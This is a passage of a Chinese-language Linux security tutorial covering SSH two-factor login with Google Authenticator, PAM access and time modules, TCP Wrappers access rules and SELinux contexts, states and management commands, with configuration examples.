<span style="color: #b22222;">#</span><span style="color: #b22222;">&#23433;&#35013;google authenticator</span>
yum install -y google-authenticator.x86_64


<span style="color: #483d8b;">echo</span> -e <span style="color: #8b2252;">"\033[31mDo you want me to update your "</span>/root/.google_authenticator<span style="color: #8b2252;">"</span>
<span style="color: #8b2252;">file? (y/n) y"</span>
<span style="color: #483d8b;">echo</span> -e <span style="color: #8b2252;">"\033[31m&#20320;&#24076;&#26395;&#25105;&#26356;&#26032;&#20320;&#30340;&#8220;/root/.google_authenticator&#8221;&#25991;&#20214;&#21527;(y/n)&#65311;\033[0m"</span>
<span style="color: #483d8b;">echo</span> -e <span style="color: #8b2252;">"\033[31mDo you want to disallow multiple uses of the same</span>
<span style="color: #8b2252;">authentication"</span>
<span style="color: #483d8b;">echo</span> -e <span style="color: #8b2252;">"\033[31mtoken? This restricts you to one login about every 30s, but it</span>
<span style="color: #8b2252;">increases"</span>
<span style="color: #483d8b;">echo</span> -e <span style="color: #8b2252;">"\033[31myour chances to notice or even prevent man-in-the-middle</span>
<span style="color: #8b2252;">attacks (y/n) y"</span>
<span style="color: #483d8b;">echo</span> -e <span style="color: #8b2252;">"\033[31m&#20320;&#24076;&#26395;&#31105;&#27490;&#22810;&#27425;&#20351;&#29992;&#21516;&#19968;&#20010;&#39564;&#35777;&#20196;&#29260;&#21527;?&#36825;&#38480;&#21046;&#20320;&#27599;&#27425;&#30331;&#24405;&#30340;&#26102;&#38388;&#22823;&#32422;&#26159;30&#31186;&#65292; &#20294;&#26159;&#36825;&#21152;&#22823;&#20102;&#21457;&#29616;&#25110;&#29978;&#33267;&#38450;&#27490;&#20013;&#38388;&#20154;&#25915;&#20987;&#30340;&#21487;&#33021;&#24615;(y/n)?\033[0m"</span>
<span style="color: #483d8b;">echo</span> -e <span style="color: #8b2252;">"\033[31mBy default, a new token is generated every 30 seconds by the</span>
<span style="color: #8b2252;">mobile app."</span>
<span style="color: #483d8b;">echo</span> -e <span style="color: #8b2252;">"\033[31mIn order to compensate for possible time-skew between the</span>
<span style="color: #8b2252;">client and the server,"</span>
<span style="color: #483d8b;">echo</span> -e <span style="color: #8b2252;">"\033[31mwe allow an extra token before and after the current time. This allows for a"</span>
<span style="color: #483d8b;">echo</span> -e <span style="color: #8b2252;">"\033[31mtime skew of up to 30 seconds between authentication server and client. If you"</span>
<span style="color: #483d8b;">echo</span> -e <span style="color: #8b2252;">"\033[31mexperience problems with poor time synchronization, you can</span>
<span style="color: #8b2252;">increase the window"</span>
<span style="color: #483d8b;">echo</span> -e <span style="color: #8b2252;">"\033[31mfrom its default size of 3 permitted codes (one previous code,</span>
<span style="color: #8b2252;">the current"</span>
<span style="color: #483d8b;">echo</span> -e <span style="color: #8b2252;">"\033[31mcode, the next code) to 17 permitted codes (the 8 previous</span>
<span style="color: #8b2252;">codes, the current"</span>
<span style="color: #483d8b;">echo</span> -e <span style="color: #8b2252;">"\033[31mcode, and the 8 next codes). This will permit for a time skew</span>
<span style="color: #8b2252;">of up to 4 minutes"</span>
<span style="color: #483d8b;">echo</span> -e <span style="color: #8b2252;">"\033[31mbetween client and server."</span>
<span style="color: #483d8b;">echo</span> -e <span style="color: #8b2252;">"\033[31mDo you want to do so? (y/n) y"</span>
<span style="color: #483d8b;">echo</span> -e <span style="color: #8b2252;">"\033[31m&#40664;&#35748;&#24773;&#20917;&#19979;&#65292;&#20196;&#29260;&#20445;&#25345;30&#31186;&#26377;&#25928;;&#20026;&#20102;&#34917;&#20607;&#23458;&#25143;&#26426;&#19982;&#26381;&#21153;&#22120;&#20043;&#38388;&#21487;&#33021;&#23384;&#22312;&#30340;&#26102;&#28382;&#65292;\033[0m"</span>
<span style="color: #483d8b;">echo</span> -e <span style="color: #8b2252;">"\033[31m&#25105;&#20204;&#20801;&#35768;&#22312;&#24403;&#21069;&#26102;&#38388;&#21069;&#21518;&#26377;&#19968;&#20010;&#39069;&#22806;&#20196;&#29260;&#12290;&#22914;&#26524;&#20320;&#22312;&#26102;&#38388;&#21516;&#27493;&#26041;&#38754;&#36935;&#21040;&#20102;&#38382;&#39064;&#65292; &#21487;&#20197;&#22686;&#21152;&#31383;&#21475;&#20174;&#40664;&#35748;&#30340;3&#20010;&#21487;&#36890;&#36807;&#39564;&#35777;&#30721;&#22686;&#21152;&#21040;17&#20010;&#21487;&#36890;&#36807;&#39564;&#35777;&#30721;&#65292;\033[0m"</span>
<span style="color: #483d8b;">echo</span> -e <span style="color: #8b2252;">"\033[31m&#36825;&#23558;&#20801;&#35768;&#23458;&#25143;&#26426;&#19982;&#26381;&#21153;&#22120;&#20043;&#38388;&#30340;&#26102;&#24046;&#22686;&#21152;&#21040;4&#20998;&#38047;&#12290;&#20320;&#24076;&#26395;&#36825;&#20040;&#20570;&#21527;(y/n)?\033[0m"</span>
<span style="color: #483d8b;">echo</span> -e <span style="color: #8b2252;">"\033[31mIf the computer that you are logging into isn't hardened</span>
<span style="color: #8b2252;">against brute-force"</span>
<span style="color: #483d8b;">echo</span> -e <span style="color: #8b2252;">"\033[31mlogin attempts, you can enable rate-limiting for the</span>
<span style="color: #8b2252;">authentication module."</span>
<span style="color: #483d8b;">echo</span> -e <span style="color: #8b2252;">"\033[31mBy default, this limits attackers to no more than 3 login</span>
<span style="color: #8b2252;">attempts every 30s."</span>
<span style="color: #483d8b;">echo</span> -e <span style="color: #8b2252;">"\033[31mDo you want to enable rate-limiting? (y/n) y"</span>
<span style="color: #483d8b;">echo</span> -e <span style="color: #8b2252;">"\033[31m&#22914;&#26524;&#20320;&#30331;&#24405;&#30340;&#37027;&#21488;&#35745;&#31639;&#26426;&#27809;&#26377;&#32463;&#36807;&#22266;&#21270;&#65292;&#20197;&#38450;&#33539;&#36816;&#29992;&#34542;&#21147;&#30340;&#30331;&#24405;&#20225;&#22270;&#65292;&#21487;&#20197;&#23545;&#39564;&#35777;&#27169;&#22359;\033[0m"</span>
<span style="color: #483d8b;">echo</span> -e <span style="color: #8b2252;">"\033[31m&#21551;&#29992;&#23581;&#35797;&#27425;&#25968;&#38480;&#21046;&#12290;&#40664;&#35748;&#24773;&#20917;&#19979;&#65292;&#36825;&#38480;&#21046;&#25915;&#20987;&#32773;&#27599;30&#31186;&#35797;&#22270;&#30331;&#24405;&#30340;&#27425;&#25968;&#21482;&#26377;3&#27425;&#12290; &#20320;&#24076;&#26395;&#21551;&#29992;&#23581;&#35797;&#27425;&#25968;&#38480;&#21046;&#21527;(y/n)?\033[0m"</span>
<span style="color: #483d8b;">echo</span> -e <span style="color: #8b2252;">"\033[32m &#22312;App Store &#25628;&#32034;Google Authenticator &#36827;&#34892;App&#23433;&#35013; \033[0m"</span>

google-authenticator

<span style="color: #b22222;">#</span><span style="color: #b22222;">/etc/pam.d/sshd&#25991;&#20214;&#65292;&#20462;&#25913;&#25110;&#28155;&#21152;&#19979;&#34892;&#20445;&#23384;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">auth required pam_google_authenticator.so</span>
sed -i <span style="color: #8b2252;">'1a\auth required pam_google_authenticator.so'</span> /etc/pam.d/sshd
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#32534;&#36753;/etc/ssh/sshd_config&#25214;&#21040;&#19979;&#34892;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">ChallengeResponseAuthentication no</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#26356;&#25913;&#20026;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">ChallengeResponseAuthentication yes # &#26159;&#21542;&#20801;&#35768;&#36136;&#30097;-&#24212;&#31572;(challenge-response)&#35748;&#35777;&#12290;&#40664;&#35748;&#20540;&#26159;"yes"</span>
sed -i <span style="color: #8b2252;">'s/.*ChallengeResponseAuthentication.*/ChallengeResponseAuthentication yes/'</span> /etc/ssh/sshd_config

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#37325;&#21551;SSH&#26381;&#21153;</span>
service sshd restart
</pre>
</div>
</div>
</div>
<div id="outline-container-h:6e042263-7e8d-4345-8eb2-501011ff70f3" class="outline-4">
<h4 id="h:6e042263-7e8d-4345-8eb2-501011ff70f3"><code>pam_access.so</code> 模块</h4>
<div class="outline-text-4" id="text-h:6e042263-7e8d-4345-8eb2-501011ff70f3">
<p>
功能：根据/etc/secruity/access.conf文件控制用户的登录地点
</p>

<p>
<a href="http://www.linux-pam.org/Linux-PAM-html/sag-pam_access.html">http://www.linux-pam.org/Linux-PAM-html/sag-pam_access.html</a>
</p>

<p>
配置文件格式
</p>

<div class="org-src-container">
<pre class="src src-sh">permission:users/groups:origins

&#26684;&#24335;&#35828;&#26126;
permission&#65306;&#21487;&#20197;&#26159; &#8220;+&#8221;&#25110;&#8221;-&#8221;&#65292;&#34920;&#31034;&#20801;&#35768;&#25110;&#25298;&#32477;&#12290;
user      &#65306;&#21487;&#20197;&#26159;&#29992;&#25143;&#21517;&#12289;&#29992;&#25143;&#32452;&#21517;&#65292;ALL &#34920;&#31034;&#25152;&#26377;&#29992;&#25143;&#12290;
origins   &#65306;&#30331;&#24405;&#22320;&#28857;&#12290;
    <span style="color: #483d8b;">local</span>&#34920;&#31034;&#26412;&#22320;&#65292;ALL&#34920;&#31034;&#25152;&#26377;&#22320;&#28857;&#65292; console&#34920;&#31034;&#25511;&#21046;&#21488;&#30331;&#24405;

&#20851;&#38190;&#23383;&#65306; EXCEPT&#34920;&#31034;&#38500;&#20102;
&#27880;&#24847;&#65306;root&#36134;&#25143;&#30340;&#30331;&#24405;&#22320;&#28857;&#19981;&#22312;access.conf&#25991;&#20214;&#20013;&#25511;&#21046;&#65292;&#32780;&#26159;&#30001;/etc/securetty&#25991;&#20214;&#25511;&#21046;&#12290;
</pre>
</div>

<p>
范例：
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#38500;&#20102;&#29992;&#25143;wheel&#12289;shutdown&#12289;sync&#31105;&#27490;&#25152;&#26377;&#30340;&#25511;&#21046;&#21488;&#30331;&#24405;&#65306;</span>
-:ALL EXCEPT wheel shutdown sync:console

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#32452;&#21512;</span>
+:root:ALL          <span style="color: #b22222;"># </span><span style="color: #b22222;">root&#20174;&#20219;&#24847;&#20301;&#32622;&#36830;&#20837;&#31995;&#32479;</span>
+:redhat:164.70.12. <span style="color: #b22222;"># </span><span style="color: #b22222;">redhat&#21482;&#33021;&#20174;&#36825;&#20010;&#32593;&#27573;&#36830;&#20837;</span>
-:ALL:ALL           <span style="color: #b22222;"># </span><span style="color: #b22222;">&#20854;&#20313;DENY</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-h:355cc79f-4a79-4d54-88df-645d9abec8bc" class="outline-4">
<h4 id="h:355cc79f-4a79-4d54-88df-645d9abec8bc"><code>pam_time.so</code> 模块</h4>
<div class="outline-text-4" id="text-h:355cc79f-4a79-4d54-88df-645d9abec8bc">
<p>
范例：限制用户LOGIN时间
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">redhat&#27599;&#26143;&#26399;&#20108;&#26202;&#19978;22&#65306;00-22&#65306;30&#19981;&#33021;&#20351;&#29992;SSH&#26469;login&#31995;&#32479;</span>
vi /etc/security/time.conf
sshd;*;redhat;!Tu2200-2230

vi /etc/pam.d/sshd
account required pam_time.so
</pre>
</div>
</div>
</div>
<div id="outline-container-h:dc3c7b86-8eb9-455f-9b4a-d1d0d64a1383" class="outline-4">
<h4 id="h:dc3c7b86-8eb9-455f-9b4a-d1d0d64a1383"><code>pam_listfile.so</code> 模块</h4>
<div class="outline-text-4" id="text-h:dc3c7b86-8eb9-455f-9b4a-d1d0d64a1383">
<p>
范例：用户访问控制
</p>

<div class="org-src-container">
<pre class="src src-sh">&#29992;&#25143;&#35775;&#38382;&#25511;&#21046;
vi /etc/pam.d/vsftpd &#21152;&#20837;&#20197;&#19979;&#19968;&#34892;
auth required pam_listfile.so <span style="color: #a0522d;">item</span>=user <span style="color: #a0522d;">sense</span>=deny <span style="color: #a0522d;">file</span>=/etc/ftpusers <span style="color: #a0522d;">onerr</span>=succeed
vi /etc/ftpusers &#8230;&#8230;
</pre>
</div>
</div>
</div>
</div>
</section>
<section id="outline-container-h:ffcd3712-174d-478a-b7c7-aa2b7f88387a" class="outline-2">
<h2 id="h:ffcd3712-174d-478a-b7c7-aa2b7f88387a">TCP Warpper</h2>
<div class="outline-text-2" id="text-h:ffcd3712-174d-478a-b7c7-aa2b7f88387a">
<p>
centos8已经淘汰这个了
</p>
</div>
<div id="outline-container-h:2fd1d7dc-f664-45ae-a000-ae24300f14fa" class="outline-3">
<h3 id="h:2fd1d7dc-f664-45ae-a000-ae24300f14fa">TCP_Wrappers介绍</h3>
<div class="outline-text-3" id="text-h:2fd1d7dc-f664-45ae-a000-ae24300f14fa">
<p>
作者：Wieste Venema，IBM，Google，工作在第四层（传输层）的TCP协议，对
有状态连接的特定服务进行安全检测并实现访问控制，以库文件形式实现某进程
是否接受libwrap的控制取决于发起此进程的程序在编译时是否针对libwrap进行
编译的
</p>

<p>
判断服务程序是否能够由tcp_wrapper进行访问控制的方法：
</p>

<div class="org-src-container">
<pre class="src src-sh">ldd /PATH/TO/PROGRAM|grep libwrap.so
</pre>
</div>

<p>
范例：
</p>

<div class="org-src-container">
<pre class="src src-sh">[root@centos7 ~]#ldd <span style="color: #ff00ff;">`which sshd `</span> |grep libwra
libwrap.so.0 =&gt; /lib64/libwrap.so.0 (0x00007f58c2249000)

[root@centos8 ~]#ldd <span style="color: #ff00ff;">`which sshd `</span> |grep libwrap
</pre>
</div>
</div>
</div>
<div id="outline-container-h:ba4593f2-ca02-4f4d-a9a3-879665648e57" class="outline-3">
<h3 id="h:ba4593f2-ca02-4f4d-a9a3-879665648e57">TCP_Wrappers的使用</h3>
<div class="outline-text-3" id="text-h:ba4593f2-ca02-4f4d-a9a3-879665648e57">
<p>
配置文件：/etc/hosts.allow, /etc/hosts.deny
</p>

<p>
帮助参考： <code>man 5 hosts_access</code> ， <code>man 5 hosts_options</code>
</p>

<p>
检查顺序：hosts.allow，hosts.deny（默认允许），注意：一旦前面规则匹配，
直接生效，将不再继续
</p>

<p>
判断某服务是否能够由tcp_wrapper进行访问控制的方法：
</p>

<pre class="example" id="orgf52f227">
1) 动态编译：ldd命令；
ldd $(which COMMAND) | grep libwrap
2) 静态编译：strings命令查看应用程序文件，其结果中是否出现了hosts.allow和hosts.deny文件；

注意：
CentOS6主机上的telnet服务托管于xinetd，后者接受libwrap控制；
CentOS7主机上的telnet服务未托管于xinetd，而in.telnetd程序未链接至libwrap；
</pre>

<p>
<b>配置基本语法:</b>
</p>

<div class="org-src-container">
<pre class="src src-sh">daemon_list@host: client_list [ :options :option&#8230; ]
</pre>
</div>

<ol class="org-ol">
<li><code>Daemon_list@host</code> 格式</li>
</ol>

<pre class="example" id="orgb9eb446">
单个应用程序的二进制文件名，而非服务名，例如vsftpd
以逗号或空格分隔的应用程序文件名列表，如:sshd,vsftpd
ALL表示所有接受tcp_wrapper控制的服务程序
主机有多个IP，可用@hostIP来实现控制,如：in.telnetd@192.168.0.254
</pre>

<p>
2.客户端 <code>Client_list</code> 格式
</p>

<pre class="example" id="org85d9b9b">
以逗号或空格分隔的客户端列表
基于IP地址：192.168.10.1     192.168.1.
基于主机名：www.meu.com .meu.com 较少用
基于网络/掩码：192.168.0.0/255.255.255.0
基于net/prefixlen: 192.168.1.0/24（CentOS7）
基于网络组（NIS 域）：@mynetwork
内置ACL：
    ALL：所有主机；
    KNOWN： 所有已知可以解析的主机
    UNKNOWN：主机名不能反解的主机
    PARANOID：正向解析和安详解析不匹配的主机

EXCEPT     排除相关地址
</pre>

<p>
范例：EXCEPT用法
</p>

<div class="org-src-container">
<pre class="src src-sh">vsftpd: 172.16. EXCEPT 172.16.100.0/24 EXCEPT 172.16.100.1
</pre>
</div>

<p>
范例：只允许192.168.1.0/24的主机访问sshd
</p>

<div class="org-src-container">
<pre class="src src-sh">/etc/hosts.allow
sshd: 192.168.1.             
/etc/hosts.deny         
sshd :ALL
</pre>
</div>

<p>
范例：只允许192.168.1.0/24的主机访问telnet和vsftpd服务
</p>

<div class="org-src-container">
<pre class="src src-sh">/etc/hosts.allow
vsftpd,in.telnetd: 192.168.1.
/etc/host.deny
vsftpd,in.telnetd: ALL
</pre>
</div>

<p>
<code>[:options]</code> 选项格式：帮助：man 5 hosts_options
</p>

<ul class="org-ul">
<li>deny 主要用在/etc/hosts.allow定义“拒绝”规则，如：vsftpd: 172.16. :deny</li>
<li>allow 主要用在/etc/hosts.deny定义“允许”规则，如：vsftpd:172.16. :allow</li>
<li>spawn 启动一个外部程序完成执行的操作</li>
<li>twist 实际动作是拒绝访问,使用指定操作替换当前服务,标准输出和ERROR发
送到客户端,默认至/dev/null</li>
</ul>

<p>
范例：
</p>

<div class="org-src-container">
<pre class="src src-sh">vim /etc/hosts.allow
sshd: ALL :spawn echo <span style="color: #8b2252;">"$(</span><span style="color: #ff00ff;">date +%%F</span><span style="color: #8b2252;">) login attempt from %c to %s,%d"</span> &gt;&gt;/var/log/sshd.log

&#35828;&#26126;&#65306;
&#22312;/etc/hosts.allow&#20013;&#28155;&#21152;&#65292;&#20801;&#35768;&#30331;&#24405;&#65292;&#24182;&#35760;&#24405;&#26085;&#24535;
&#22312;/etc/hosts.deny&#20013;&#28155;&#21152;&#65292;&#25298;&#32477;&#30331;&#24405;&#65292;&#24182;&#35760;&#24405;&#26085;&#24535;
%c &#23458;&#25143;&#31471;&#20449;&#24687;
%s &#26381;&#21153;&#22120;&#31471;&#20449;&#24687;
%d &#26381;&#21153;&#21517;
%p &#23432;&#25252;&#36827;&#31243;&#30340;PID
%% &#34920;&#31034;%
</pre>
</div>

<p>
范例：
</p>

<div class="org-src-container">
<pre class="src src-sh">vim /etc/hosts.allow
vsftpd: 172.16. :twist /bin/echo <span style="color: #8b2252;">"connection prohibited"</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-h:d84c151f-752e-487e-ba8d-c5f091364f97" class="outline-3">
<h3 id="h:d84c151f-752e-487e-ba8d-c5f091364f97">测试工具tcpdmatch</h3>
<div class="outline-text-3" id="text-h:d84c151f-752e-487e-ba8d-c5f091364f97">
<div class="org-src-container">
<pre class="src src-sh">tcpdmatch [-d] daemon[@host] client
</pre>
</div>

<p>
选项： -d 测试当前目录下的hosts.allow和hosts.deny
</p>

<p>
范例：
</p>

<div class="org-src-container">
<pre class="src src-sh">tcpdmatch -d sshd 192.168.8.100
</pre>
</div>

<p>
练习仅开放本机两个IP地址中的一个地址172.16.0.X上绑定的sshd和vsftpd服务
给172.16.0.0/16网络中除了172.16.0.0/24网络中的主机之外的所有主机，但允
许172.16.0.200访问,每次的用户访问都要记录于日志文件中，注：其中X为学号
</p>

<p>
编写脚本/root/bin/checkip.sh，每5分钟检查一次，如果发现通过ssh登录失败
次数超过10次，自动将此远程IP放入Tcp Wrapper的黑名单中予以禁止防问
</p>
</div>
</div>
</section>
<section id="outline-container-h:d4fcca2d-a9de-437b-a5cd-cd552a7b2793" class="outline-2">
<h2 id="h:d4fcca2d-a9de-437b-a5cd-cd552a7b2793">SELinux</h2>
<div class="outline-text-2" id="text-h:d4fcca2d-a9de-437b-a5cd-cd552a7b2793">
</div>
<div id="outline-container-h:8f53e9d4-edde-471f-b543-55c951cff3c2" class="outline-3">
<h3 id="h:8f53e9d4-edde-471f-b543-55c951cff3c2">SELinux 介绍和工作原理</h3>
<div class="outline-text-3" id="text-h:8f53e9d4-edde-471f-b543-55c951cff3c2">
</div>
<div id="outline-container-h:f7019f75-5fae-4ffb-87cb-dbb30bf592f9" class="outline-4">
<h4 id="h:f7019f75-5fae-4ffb-87cb-dbb30bf592f9">SELinux 介绍</h4>
<div class="outline-text-4" id="text-h:f7019f75-5fae-4ffb-87cb-dbb30bf592f9">
<p>
SELinux：Security-Enhanced Linux， 是美国国家安全局(NSA=The National
Security Agency)和 SCC(Secure Computing Corporation)开发的Linux的一个
强制访问控制的安全模块。2000年以GNU GPL发布，Linux内核2.6版本后集成在
内核中
</p>

<p>
DAC：Discretionary Access Control自由访问控制
</p>

<p>
MAC：Mandatory Access Control 强制访问控制
</p>

<p>
DAC环境下进程是无束缚的
</p>

<p>
MAC环境下策略的规则决定控制的严格程度
</p>

<p>
MAC环境下进程可以被限制的策略被用来定义被限制的进程能够使用那些资源（文件和端口）
</p>

<p>
默认情况下，没有被明确允许的行为将被拒绝
</p>
</div>
</div>
<div id="outline-container-h:80e6d452-2506-4a9a-9526-011d94eda739" class="outline-4">
<h4 id="h:80e6d452-2506-4a9a-9526-011d94eda739">SELinux 相关概念</h4>
<div class="outline-text-4" id="text-h:80e6d452-2506-4a9a-9526-011d94eda739">
<p>
对象(object)：所有可以读取的对象，包括文件、目录和进程，端口等
</p>

<p>
主体：进程称为主体(subject)
</p>

<p>
SELinux中对所有的文件都赋予一个type的文件类型标签，对于所有的进程也赋
予各自的一个domain的标签。domain标签能够执行的操作由安全策略里定义
</p>

<p>
当一个subject试图访问一个object，Kernel中的策略执行服务器将检查AVC (访
问矢量缓存Access Vector Cache),在AVC中，subject和object的权限被缓存
(cached)，查找“应用+文件”的安全环境。然后根据查询结果允许或拒绝访问
</p>

<p>
安全策略：定义主体读取对象的规则数据库，规则中记录了哪个类型的主体使用
哪个方法读取哪一个对象是允许还是拒绝的，并且定义了哪种行为是充许或拒绝
</p>


<figure id="org6cc96a6">
<img src="images/image-20210120203627879.png" alt="image-20210120203627879.png" width="50%">

</figure>
</div>
</div>
<div id="outline-container-h:e2810fad-0be7-4cb2-84a3-81cf4bd08918" class="outline-4">
<h4 id="h:e2810fad-0be7-4cb2-84a3-81cf4bd08918">SELinux有四种工作类型</h4>
<div class="outline-text-4" id="text-h:e2810fad-0be7-4cb2-84a3-81cf4bd08918">
<ul class="org-ul">
<li>Strict：CentOS 5,每个进程都受到selinux的控制</li>
<li>targeted：用来保护常见的网络服务,仅有限进程受到selinux控制，只监控容
易被入侵的进程，CentOS 4只保护13个服务，CentOS 5保护88个服务</li>
<li>minimum：CentOS 7,修改的 targeted，只对选择的网络服务</li>
<li>mls：提供MLS（多级安全）机制的安全性</li>
</ul>

<p>
targeted为默认类型，minimum和mls稳定性不足，未加以应用，strict已不再使用
</p>
</div>
</div>
<div id="outline-container-h:392d65ae-9b65-4176-b464-7d3dbb250970" class="outline-4">
<h4 id="h:392d65ae-9b65-4176-b464-7d3dbb250970">SELinux安全上下文</h4>
<div class="outline-text-4" id="text-h:392d65ae-9b65-4176-b464-7d3dbb250970">
<p>
传统Linux，一切皆文件，由用户，组，权限控制访问，在SELinux中，一切皆对
象（object），由存放在inode的扩展属性域的安全元素所控制其访问，所有文
件和端口资源和进程都具备安全标签：安全上下文（security context）
</p>

<p>
安全上下文有五个元素组成：
</p>

<div class="org-src-container">
<pre class="src src-sh">user:role:type:sensitivity:category
</pre>
</div>

<p>
实际上下文：存放在文件系统中， <code>ls -Z;ps -Z</code>
</p>

<p>
期望(默认)上下文：存放在二进制的SELinux策略库（映射目录和期望安全上下
文）中 <code>semanage fcontext -l</code>
</p>

<p>
五个安全元素
</p>
<ul class="org-ul">
<li>User：指示登录系统的用户类型,进程：如system_u为系统服务进程，是受到
管制的，unconfined_u为不管制的进程，用户自己开启的，如 bash，文件：
system_u系统进程创建的文件， unconfined_u为用户自已创建的文件</li>
<li>Role：定义文件，进程和用户的用途：进程：system_r为系统服务进程，受到
管制。unconfined_r 为不管制进程，通常都是用户自己开启的，如 bash，文
件:object_r</li>
<li>Type：指定数据类型，规则中定义何种进程类型访问何种文件Target策略基于
type实现,多服务共用：public_content_t</li>
<li>Sensitivity：限制访问的需要，由组织定义的分层安全级别，如
unclassified,secret,top,secret, 一个对象有且只有一个sensitivity,分
0-15级，s0最低,Target策略默认使用s0</li>
<li>Category：对于特定组织划分不分层的分类，如FBI Secret，NSA secret, 一
个对象可以有多个categroy， c0-c1023共1024个分类， Target 策略不使用
category</li>
</ul>
</div>
</div>
</div>
<div id="outline-container-h:113a940c-974a-4a6a-8937-fcbc045a6b10" class="outline-3">
<h3 id="h:113a940c-974a-4a6a-8937-fcbc045a6b10">启用和禁用SELinux</h3>
<div class="outline-text-3" id="text-h:113a940c-974a-4a6a-8937-fcbc045a6b10">
<p>
SELinux的状态：
</p>
<ul class="org-ul">
<li>enforcing：强制，每个受限的进程都必然受限</li>
<li>permissive：允许，每个受限的进程违规操作不会被禁止，但会被记录于审计日志</li>
<li>disabled：禁用</li>
</ul>

<p>
相关命令：
</p>
<ul class="org-ul">
<li>getenforce: 获取selinux当前状态</li>
<li>sestatus :查看selinux状态</li>
<li>setenforce 0|1 0: 设置为permissive 1: 设置为enforcing</li>
</ul>


<p>
范例：关闭selinux
</p>

<div class="org-src-container">
<pre class="src src-sh">setenforce 0
sed -ri <span style="color: #8b2252;">'/^[^#]*SELINUX=/s#=.+$#=disabled#'</span> /etc/selinux/config
</pre>
</div>

<p>
配置文件:
</p>

<pre class="example" id="org5d584f4">
/boot/grub/grub.conf 在kernel行使用selinux=0禁用SELinux
/boot/grub2/grub.cfg 在linux16行使用selinux=0禁用SELinux
/etc/selinux/config 或 /etc/sysconfig/selinux 中 SELINUX={disabled|enforcing|permissive}
</pre>
</div>
</div>
<div id="outline-container-h:25ccd806-c8f7-4579-8b30-01dca5c67b88" class="outline-3">
<h3 id="h:25ccd806-c8f7-4579-8b30-01dca5c67b88">管理文件安全标签</h3>
<div class="outline-text-3" id="text-h:25ccd806-c8f7-4579-8b30-01dca5c67b88">
<p>
给文件重新打安全标签chcon：
</p>

<pre class="example" id="orgf9b1143">
chcon [OPTION]... [-u USER] [-r ROLE] [-t TYPE] FILE...
chcon [OPTION]... --reference=RFILE FILE...
-R：递归打标
</pre>

<p>
恢复目录或文件默认的安全上下文：
</p>

<div class="org-src-container">
<pre class="src src-sh">restorecon [-R] /path/to/somewhere
</pre>
</div>

<p>
默认安全上下文查询与修改semanage：来自policycoreutils-python包
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#26597;&#30475;&#40664;&#35748;&#30340;&#23433;&#20840;&#19978;&#19979;&#25991;</span>
semanage fcontext &#8211;l

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#28155;&#21152;&#23433;&#20840;&#19978;&#19979;&#25991;</span>
semanage fcontext     -a &#8211;t httpd_sys_content_t     &#8216;/testdir(/.*)?&#8217;
restorecon &#8211;Rv /testdir

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#21024;&#38500;&#23433;&#20840;&#19978;&#19979;&#25991;</span>
semanage fcontext     -d &#8211;t httpd_sys_content_t     &#8216;/testdir(/.*)?&#8217;
</pre>
</div>
</div>
</div>
<div id="outline-container-h:11c3cf38-e659-41c9-bc58-676ba15b301b" class="outline-3">
<h3 id="h:11c3cf38-e659-41c9-bc58-676ba15b301b">管理端口标签</h3>
<div class="outline-text-3" id="text-h:11c3cf38-e659-41c9-bc58-676ba15b301b">
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#26597;&#30475;&#31471;&#21475;&#26631;&#31614;</span>
semanage port &#8211;l

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#28155;&#21152;&#31471;&#21475;</span>
semanage port -a -t port_label -p tcp|udp PORT
semanage port -a -t http_port_t     -p tcp 9527

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#21024;&#38500;&#31471;&#21475;</span>
semanage port -d -t port_label -p tcp|udp PORT
semanage port -d -t http_port_t     -p tcp 9527

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#20462;&#25913;&#29616;&#26377;&#31471;&#21475;&#20026;&#26032;&#26631;&#31614;</span>
semanage port -m -t port_label -p tcp|udp PORT
semanage port -m -t http_port_t -p tcp 9527
</pre>
</div>
</div>
</div>
<div id="outline-container-h:51419588-06cf-480c-9058-125556748803" class="outline-3">
<h3 id="h:51419588-06cf-480c-9058-125556748803">管理SELinux布尔值开关</h3>
<div class="outline-text-3" id="text-h:51419588-06cf-480c-9058-125556748803">
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#24067;&#23572;&#22411;&#35268;&#21017;&#65306;</span>
getsebool
setsebool

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#26597;&#30475;bool&#21629;&#20196;&#65306;</span>
getsebool [-a] [boolean]
semanage boolean &#8211;l
semanage boolean -l &#8211;C &#26597;&#30475;&#20462;&#25913;&#36807;&#30340;&#24067;&#23572;&#20540;

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#35774;&#32622;bool&#20540;&#21629;&#20196;&#65306;</span>
setsebool [-P] boolean value&#65288;on,off&#65289;
setsebool [-P] <span style="color: #a0522d;">Boolean</span>=value&#65288;1&#65292;0&#65289;
</pre>
</div>
</div>
</div>
<div id="outline-container-h:081ea980-84c3-4f1a-bba1-ad184bd181c4" class="outline-3">
<h3 id="h:081ea980-84c3-4f1a-bba1-ad184bd181c4">管理日志</h3>
<div class="outline-text-3" id="text-h:081ea980-84c3-4f1a-bba1-ad184bd181c4">
<p>
yum install setroubleshoot（重启生效）
</p>

<p>
将错误的信息写入/var/log/message
</p>

<div class="org-src-container">
<pre class="src src-sh">grep setroubleshoot /var/log/messages
</pre>
</div>

<p>
查看安全事件日志说明
</p>

<div class="org-src-container">
<pre class="src src-sh">sealert -l UUID
</pre>
</div>

<p>
扫描并分析日志
</p>

<div class="org-src-container">
<pre class="src src-sh">sealert -a /var/log/audit/audit.log
</pre>
</div>
</div>
</div>
